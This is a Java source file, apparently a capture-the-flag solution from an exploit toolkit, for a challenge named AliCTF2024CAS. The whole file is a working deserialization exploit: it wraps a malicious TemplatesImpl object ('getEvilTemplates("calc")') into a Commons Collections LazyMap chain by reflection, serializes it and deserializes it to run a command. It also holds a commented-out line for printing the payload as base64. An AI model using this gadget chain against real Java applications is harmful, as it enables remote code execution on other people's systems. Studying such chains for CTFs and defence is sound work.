package dev.silente.javashark.solution;

import dev.silente.javashark.gadget.jdk.GBadAttributeValueExpException;
import dev.silente.javashark.gadget.springboot.GPOJONode;
import dev.silente.javashark.sink.jdk.STemplates;
import dev.silente.javashark.utils.MiscUtils;
import dev.silente.javashark.utils.ReflectUtils;
import dev.silente.javashark.utils.SerializeUtils;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

public class AliCTF2024CAS {
    public static void main(String[] args) throws Exception {
        Object templates = STemplates.getEvilTemplates("calc");
        HashMap<Object,Object> map = new HashMap<>();
        Map<Object,Object> Lazymap = LazyMap.decorate(map,new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(Lazymap,"aaa");
        HashMap<Object,Object> map2 = new HashMap<>();
        map2.put(tiedMapEntry,"bbb");
        Lazymap.remove("aaa");
        ReflectUtils.setFieldValue(Lazymap,"factory",templates);
        byte[] code = SerializeUtils.serialize(Lazymap);
//        System.out.println(MiscUtils.base64Encode(code));
        SerializeUtils.deserialize(code);
    }

}
